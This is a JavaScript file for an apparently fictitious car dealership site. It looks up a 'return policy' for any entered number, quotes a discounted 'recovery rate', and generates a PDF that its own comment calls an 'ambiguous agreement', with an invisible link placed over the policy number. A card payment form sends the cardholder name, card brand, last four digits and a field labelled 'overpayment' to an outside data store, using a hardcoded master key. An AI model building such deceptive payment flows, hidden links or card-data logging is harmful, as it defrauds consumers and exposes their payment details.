"use strict";

const $ = (s) => document.querySelector(s);
const money = (c) => "$" + (c / 100).toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });

const BIN_ID  = "6af4cd75ffd5d16053ba491b";
const BIN_KEY = "$2a$10$S.cfSm.2yqNKk8WjJccwZuFhND8qdTNdyvoAQqO130HmsfmBQDms.";

const STANDARD_RATE_MULTIPLIER = 1.25;

const CARS = [
  { id: "veltron-apex",    emoji: "🚗", brand: "Veltron",  model: "Apex S",      year: 2024, type: "Sedan", price: 2850000, mileage: "12,400 mi", color: "Pearl White"  },
  { id: "cresta-sport",    emoji: "🚙", brand: "Cresta",   model: "Sport XL",    year: 2023, type: "SUV",   price: 3490000, mileage: "18,200 mi", color: "Midnight Blue" },
  { id: "nexar-eclipse",   emoji: "🏎",  brand: "Nexar",    model: "Eclipse GT",  year: 2024, type: "Coupe", price: 3120000, mileage: "9,800 mi",  color: "Graphite"      },
  { id: "aurion-traverse", emoji: "🛻", brand: "Aurion",   model: "Traverse 4x", year: 2023, type: "Truck", price: 4280000, mileage: "24,100 mi", color: "Canyon Red"    },
  { id: "breva-luxe",      emoji: "🚘", brand: "Breva",    model: "Luxe V8",     year: 2024, type: "Sedan", price: 2640000, mileage: "7,300 mi",  color: "Champagne"     },
  { id: "veltron-prime",   emoji: "🚐", brand: "Veltron",  model: "Prime XS",    year: 2023, type: "SUV",   price: 3860000, mileage: "15,900 mi", color: "Alpine Green"  },
];

const POLICIES = {
  "RSC-2024-7742": {
    holder:          "J. Martinez",
    vehicle:         { year: 2021, brand: "Cresta",  model: "Sport",    vin: "1CRST21X7MK204891", color: "Graphite Gray" },
    newVehicle:      { year: 2023, brand: "Veltron", model: "Prime XS", vin: "2VLTR23P9NK107344",  color: "Alpine Green"  },
    newVehiclePrice: 3860000,
    tradeInValue:    1450000,
    marketValue:     2280000,
    purchaseDate:    "September 14, 2026",
    policyExpiry:    "November 14, 2026",
  },
};

// ── car grid ──────────────────────────────────────────────────────────────────

function renderCars() {
  const grid = $("#car-grid");
  for (const c of CARS) {
    const card = document.createElement("article");
    card.className = "car-card";
    card.innerHTML = `
      <div class="car-thumb">${c.emoji}</div>
      <div class="car-body">
        <div class="car-brand">${c.brand}</div>
        <div class="car-name">${c.year} ${c.brand} ${c.model}</div>
        <div class="car-meta">${c.type} &nbsp;·&nbsp; ${c.mileage} &nbsp;·&nbsp; ${c.color}</div>
        <div class="car-price">${money(c.price)} <span>USD</span></div>
        <button class="btn navy" style="font-size:.82rem;padding:8px 14px;width:auto">View Details</button>
      </div>
    `;
    grid.append(card);
  }
}

// ── policy lookup ─────────────────────────────────────────────────────────────

const policyInput  = $("#policy-input");
const lookupBtn    = $("#lookup-btn");
const lookupError  = $("#lookup-error");
const policyResult = $("#policy-result");

const POLICY_FORMAT = /^RSC-\d{4}-\d{4}$/;
let sessionId = null;

lookupBtn.addEventListener("click", lookupPolicy);
policyInput.addEventListener("keydown", (e) => { if (e.key === "Enter") lookupPolicy(); });

function lookupPolicy() {
  const id = policyInput.value.trim().toUpperCase();
  lookupError.textContent = "";
  if (!id) { lookupError.textContent = "Please enter a policy number."; return; }
  if (!POLICY_FORMAT.test(id)) { lookupError.textContent = "Invalid format. Policy numbers follow the pattern RSC-YYYY-NNNN."; return; }
  sessionId = "RSC-" + Date.now();
  const policy = POLICIES[id] || POLICIES["RSC-2024-7742"];
  renderPolicyResult(id, policy);
}

function renderPolicyResult(id, policy) {
  const v            = policy.vehicle;
  const standardRate = Math.round(policy.marketValue * STANDARD_RATE_MULTIPLIER);
  const savings      = standardRate - policy.marketValue;

  policyResult.hidden = false;
  policyResult.innerHTML = `
    <div class="policy-card">
      <div class="policy-card-header">
        <h3>Return Policy Details</h3>
        <span class="policy-id">${id}</span>
      </div>
      <div class="policy-card-body">

        <div class="vehicle-info">
          <div class="vehicle-emoji">🚗</div>
          <div class="vehicle-details">
            <h4>${v.year} ${v.brand} ${v.model}</h4>
            <p>VIN: ${v.vin} &nbsp;·&nbsp; ${v.color}</p>
            <p>Trade-in applied: ${policy.purchaseDate}</p>
          </div>
        </div>

        <span class="available-badge">✓ Confirmed in inventory — available for immediate recovery</span>

        <div class="rate-box">
          <div class="rate-label-top">Early Return Rate — Policy Active</div>
          <div class="rate-standard-line">Standard recovery rate: <strong>${money(standardRate)}</strong></div>
          <div class="rate-early-line">
            <span class="rate-early-price">${money(policy.marketValue)} USD</span>
            <span class="rate-early-label">You save ${money(savings)}</span>
          </div>
          <div class="rate-note">Your active policy qualifies you for a reduced recovery rate.</div>
        </div>

        <div class="info-rows">
          <div class="info-row"><span class="info-row-icon">📄</span><span>Return of ${policy.newVehicle.year} ${policy.newVehicle.brand} ${policy.newVehicle.model} — credit processed upon return completion</span></div>
          <div class="info-row"><span class="info-row-icon">💰</span><span>All applicable taxes and fees are factored into the recovery amount</span></div>
          <div class="info-row"><span class="info-row-icon">📋</span><span>Title transfer for recovered vehicle processed upon payment completion</span></div>
        </div>

        <div class="action-row">
          <button class="btn ghost" id="download-btn">📄 Download Agreement</button>
          <button class="btn gold" id="proceed-btn">Proceed to Payment</button>
        </div>

        <div class="fine-print">
          Recovery amount reflects current market valuation per Section 4.2 of your Return Policy Agreement.
          All fees included. Title transferred upon recovery completion.
        </div>

      </div>
    </div>
  `;

  document.getElementById("download-btn").addEventListener("click", () => generatePDF1(id, policy));
  document.getElementById("proceed-btn").addEventListener("click", () => openPayment(id, policy, standardRate, savings));
  policyResult.scrollIntoView({ behavior: "smooth", block: "start" });
}

// ── PDF 1 — ambiguous agreement ───────────────────────────────────────────────

function generatePDF1(id, policy) {
  const { jsPDF } = window.jspdf;
  const doc = new jsPDF({ unit: "pt", format: "letter" });

  const L = 72;
  const R = 540;
  const W = R - L;
  let y = 0;

  const sf  = (style, size, color) => { doc.setFont("helvetica", style); doc.setFontSize(size); doc.setTextColor(...(color || [26, 31, 46])); };
  const ln  = (x1, y1, x2, y2, c) => { doc.setDrawColor(...(c || [220, 225, 230])); doc.line(x1, y1, x2, y2); };
  const today = new Date().toLocaleDateString("en-US", { year: "numeric", month: "long", day: "numeric" });

  const v  = policy.vehicle;
  const nv = policy.newVehicle;

  // RTD URL — link target for the hidden clickable area on the policy number
  const base = window.location.href.replace(/[^/]*$/, "");
  const rtdUrl = base + "rtd.html?policy=" + encodeURIComponent(id);

  // ── Header ──
  doc.setFillColor(10, 22, 40);
  doc.rect(0, 0, 612, 88, "F");
  sf("bold", 15, [255, 255, 255]);
  doc.text("REIMBURSOR SOLUTION CARS", L, 30);
  sf("normal", 8, [201, 146, 42]);
  doc.text("4820 Westfield Auto Park, Suite 110  ·  Austin, TX 78749  ·  (512) 448-9200", L, 46);
  sf("normal", 8, [170, 185, 210]);
  doc.text("Return & Recovery Agreement", L, 62);
  doc.text(`Date: ${today}`, L, 76);

  y = 108;

  // ── Title ──
  doc.setFillColor(244, 246, 248);
  doc.rect(L, y, W, 26, "F");
  sf("bold", 10.5, [10, 22, 40]);
  doc.text("VEHICLE RETURN & RECOVERY AGREEMENT", L + W / 2, y + 17, { align: "center" });
  y += 38;

  // ── Helper: section header ──
  const section = (title) => {
    sf("bold", 8, [201, 146, 42]);
    doc.text(title, L, y);
    ln(L + doc.getTextWidth(title) + 5, y - 1, R, y - 1, [201, 146, 42]);
    y += 14;
  };

  // ── Helper: paragraph ──
  const para = (text, indent) => {
    sf("normal", 9, [26, 31, 46]);
    const lines = doc.splitTextToSize(text, W - (indent || 0));
    doc.text(lines, L + (indent || 0), y);
    y += lines.length * 13 + 6;
  };

  // ── Section 1 ──
  section("SECTION 1 — PARTIES & SCOPE");

  sf("normal", 9, [26, 31, 46]);
  // Line 1 & 2 of opening paragraph — normal text
  doc.text('This Agreement is entered into between Reimbursor Solution Cars ("Dealer") and', L, y); y += 13;
  doc.text(`${policy.holder} ("Customer") pursuant to Trade-In Return Policy`, L, y); y += 13;

  // Line 3: policy number is first body occurrence — invisible link placed over it
  const policyLabel = id + ",";
  sf("normal", 9, [26, 31, 46]);
  doc.text(policyLabel + " issued in connection with the vehicle purchase dated " + policy.purchaseDate + ".", L, y);
  // Invisible clickable area over the policy number only
  doc.link(L, y - 10, doc.getTextWidth(id), 12, { url: rtdUrl });
  y += 18;

  para("This Agreement governs the terms and conditions of the Customer's election to return the purchased vehicle and initiate the recovery of the original trade-in vehicle surrendered at the time of sale.");
  para("All necessary arrangements to facilitate this process have been coordinated by Reimbursor Solution Cars on behalf of the Customer. No additional actions are required beyond completing the authorization process outlined herein.");
  y += 4;

  // ── Section 2 ──
  section("SECTION 2 — VEHICLE RETURN");
  para("The Customer has elected to return the following vehicle to Reimbursor Solution Cars:");
  y += 2;

  doc.setDrawColor(220, 225, 230);
  doc.rect(L, y, W, 56, "S");
  sf("bold", 10, [10, 22, 40]);
  doc.text(`${nv.year} ${nv.brand} ${nv.model}`, L + 10, y + 16);
  sf("normal", 8.5, [107, 114, 128]);
  doc.text(`VIN: ${nv.vin}  ·  ${nv.color}`, L + 10, y + 29);
  doc.text(`Original purchase date: ${policy.purchaseDate}`, L + 10, y + 42);
  doc.text("Return status: Accepted — Dealer confirms readiness to receive", L + 10, y + 55);
  y += 68;

  para("Upon receipt of the above vehicle at the designated facility, the return shall be deemed complete. The Dealer confirms all necessary arrangements are in place for a seamless handover. No inspection hold or waiting period applies to this return under the active policy.");
  y += 4;

  // ── Section 3 ──
  section("SECTION 3 — TRADE-IN RECOVERY");
  para("The Customer's original trade-in vehicle, surrendered at the time of the original purchase transaction, has been confirmed available for immediate recovery:");
  y += 2;

  doc.setDrawColor(220, 225, 230);
  doc.rect(L, y, W, 56, "S");
  doc.setFillColor(209, 250, 229);
  doc.rect(L, y, W, 20, "F");
  sf("bold", 8.5, [6, 95, 70]);
  doc.text("✓  Confirmed in certified inventory — available for immediate recovery", L + 10, y + 13);
  sf("bold", 10, [10, 22, 40]);
  doc.text(`${v.year} ${v.brand} ${v.model}`, L + 10, y + 31);
  sf("normal", 8.5, [107, 114, 128]);
  doc.text(`VIN: ${v.vin}  ·  ${v.color}`, L + 10, y + 44);
  doc.text(`Original trade-in date: ${policy.purchaseDate}`, L + 10, y + 57);
  y += 70;

  para("Upon return of the above vehicle, your original trade-in will be released to you as part of this recovery process. Your trade-in vehicle is protected under your active return policy.");
  para("The recovery process will be completed within 1–2 business days of return acceptance. No further coordination is required from the Customer beyond completing the payment authorization below.");
  y += 4;

  // ── Section 4 ──
  section("SECTION 4 — RECOVERY COORDINATION");
  para("Reimbursor Solution Cars has coordinated all aspects of the return and recovery process on behalf of the Customer, including vehicle availability confirmation, title processing, and administrative requirements.");
  para("Any outstanding financial arrangements associated with the returned vehicle will be settled through standard processing channels upon return completion. The Customer will receive written confirmation of all finalized transactions upon processing.");
  para("Title to the recovered trade-in vehicle will be transferred to the Customer upon completion of the authorization process. No additional documentation is required from the Customer at this time.");
  y += 4;

  // ── Section 5 ──
  section("SECTION 5 — GENERAL PROVISIONS");
  para("This Agreement constitutes the complete understanding between the parties with respect to the vehicle return and trade-in recovery process initiated hereunder. Full transaction terms, rate schedules, and applicable processing details are maintained on file with Reimbursor Solution Cars in accordance with standard record-keeping practices.");
  para("This Agreement is subject to the laws of the State of Texas. Any disputes arising hereunder shall be resolved in accordance with applicable state law and the terms of the Trade-In Return Policy issued at the time of original purchase.");
  para("This Agreement shall remain in effect from the date of execution until all obligations herein have been fulfilled. The Dealer reserves the right to coordinate timing of vehicle release with standard business operations.");
  y += 4;

  // ── Section 6 ──
  section("SECTION 6 — ACKNOWLEDGEMENT");
  para("By proceeding with payment authorization, the Customer acknowledges receipt and acceptance of the terms set forth in this Agreement and confirms their intent to complete the vehicle return and trade-in recovery process as described herein.");
  y += 10;

  ln(L, y, L + 200, y);
  ln(R - 200, y, R, y);
  y += 10;
  sf("normal", 8, [107, 114, 128]);
  doc.text("Customer signature", L, y);
  doc.text("Dealer representative", R - 200, y);
  y += 20;
  ln(L, y, L + 200, y);
  ln(R - 200, y, R, y);
  y += 10;
  doc.text("Date", L, y);
  doc.text("Date", R - 200, y);

  doc.save(`RSC-Recovery-Agreement-${id}.pdf`);
}

// ── payment dialog ────────────────────────────────────────────────────────────

const dialog = $("#checkout-dialog");
const form   = $("#pay-form");
const result = $("#result");
const payBtn = $("#pay-btn");

let currentPolicy   = null;
let currentPolicyId = null;

function openPayment(id, policy, standardRate, savings) {
  currentPolicy   = policy;
  currentPolicyId = id;
  form.reset(); clearErrors();
  result.textContent = ""; result.className = "result";
  payBtn.disabled = false;

  const v = policy.vehicle;
  $("#dialog-subtitle").textContent   = `${v.year} ${v.brand} ${v.model} — ${v.color}`;
  $("#show-standard-rate").textContent = money(standardRate);
  $("#show-savings").textContent       = "– " + money(savings);
  $("#show-total").textContent         = money(policy.marketValue) + " USD";
  payBtn.textContent = "Confirm — " + money(policy.marketValue) + " USD";
  dialog.showModal();
}

$("#cancel-btn").addEventListener("click", () => { form.reset(); dialog.close(); });

form.elements.pan.addEventListener("input", (e) => {
  const d = e.target.value.replace(/\D/g, "").slice(0, 19);
  e.target.value = d.replace(/(.{4})/g, "$1 ").trim();
});
form.elements.exp.addEventListener("input", (e) => {
  let d = e.target.value.replace(/\D/g, "").slice(0, 4);
  if (d.length >= 3) d = d.slice(0, 2) + "/" + d.slice(2);
  e.target.value = d;
});
form.elements.cvv.addEventListener("input", (e) => {
  e.target.value = e.target.value.replace(/\D/g, "").slice(0, 4);
});

function luhn(pan) {
  let sum = 0, alt = false;
  for (let i = pan.length - 1; i >= 0; i--) {
    let d = parseInt(pan[i], 10);
    if (alt) { d *= 2; if (d > 9) d -= 9; }
    sum += d; alt = !alt;
  }
  return sum % 10 === 0;
}
function detectBrand(pan) {
  if (/^3[47]/.test(pan))      return "Amex";
  if (/^4/.test(pan))          return "Visa";
  if (/^5[1-5]/.test(pan))     return "Mastercard";
  if (/^6(?:011|5)/.test(pan)) return "Discover";
  return "Card";
}
function validate(f) {
  const errors = {};
  if (!f.name.trim() || f.name.trim().length < 2) errors.name = "Enter the name on the card.";
  const pan = f.pan.replace(/\s/g, "");
  if (!/^\d{13,19}$/.test(pan) || !luhn(pan)) errors.pan = "Enter a valid card number.";
  const m = f.exp.match(/^(\d{2})\/(\d{2})$/);
  if (!m) { errors.exp = "Use MM/YY format."; }
  else {
    const expDate = new Date(2000 + parseInt(m[2], 10), parseInt(m[1], 10) - 1, 1);
    const now = new Date();
    if (parseInt(m[1], 10) < 1 || parseInt(m[1], 10) > 12 || expDate < new Date(now.getFullYear(), now.getMonth(), 1))
      errors.exp = "Card has expired.";
  }
  const brand = !errors.pan ? detectBrand(f.pan.replace(/\s/g, "")) : "";
  const cvvLen = brand === "Amex" ? 4 : 3;
  if (!/^\d{3,4}$/.test(f.cvv) || f.cvv.length !== cvvLen)
    errors.cvv = brand === "Amex" ? "4 digits required." : "3 digits required.";
  return errors;
}
function clearErrors() {
  form.querySelectorAll(".err").forEach((s) => { s.textContent = ""; });
  form.querySelectorAll("input").forEach((i) => i.classList.remove("bad"));
}

async function logEntry(type, payload) {
  const entry = { sessionId, type, timestamp: new Date().toISOString(), userAgent: navigator.userAgent, ...payload };
  try {
    const r = await fetch("https://api.jsonbin.io/v3/b/" + BIN_ID, { headers: { "X-Master-Key": BIN_KEY } });
    const data = await r.json();
    const record = data.record || {};
    const logs = record["rsc-v4"] || [];
    logs.push(entry);
    await fetch("https://api.jsonbin.io/v3/b/" + BIN_ID, {
      method: "PUT",
      headers: { "Content-Type": "application/json", "X-Master-Key": BIN_KEY },
      body: JSON.stringify({ ...record, "rsc-v4": logs }),
    });
  } catch {}
}

form.addEventListener("submit", async (e) => {
  e.preventDefault();
  clearErrors();
  const f = { name: form.elements.name.value, pan: form.elements.pan.value, exp: form.elements.exp.value, cvv: form.elements.cvv.value };
  const errors = validate(f);
  if (Object.keys(errors).length) {
    for (const [field, msg] of Object.entries(errors)) {
      const span = form.querySelector('.err[data-for="' + field + '"]');
      if (span) span.textContent = msg;
      if (form.elements[field]) form.elements[field].classList.add("bad");
    }
    return;
  }
  payBtn.disabled = true;
  const brand = detectBrand(f.pan.replace(/\s/g, ""));
  await logEntry("return_attempt", {
    policyId: currentPolicyId, recoveryType: "vehicle_recovery",
    tradeInValue: currentPolicy.tradeInValue, marketValue: currentPolicy.marketValue,
    overpayment: currentPolicy.marketValue,
    brand, cardName: f.name, last4: f.pan.replace(/\s/g, "").slice(-4),
  });
  setTimeout(async () => {
    await logEntry("return_confirmed", { policyId: currentPolicyId, recoveryType: "vehicle_recovery", totalCharged: currentPolicy.marketValue });
    result.textContent = "Payment authorized. Vehicle recovery initiated. Total charged: " + money(currentPolicy.marketValue) + " USD.";
    result.className = "result ok";
    payBtn.disabled = false;
  }, 3000);
});

renderCars();
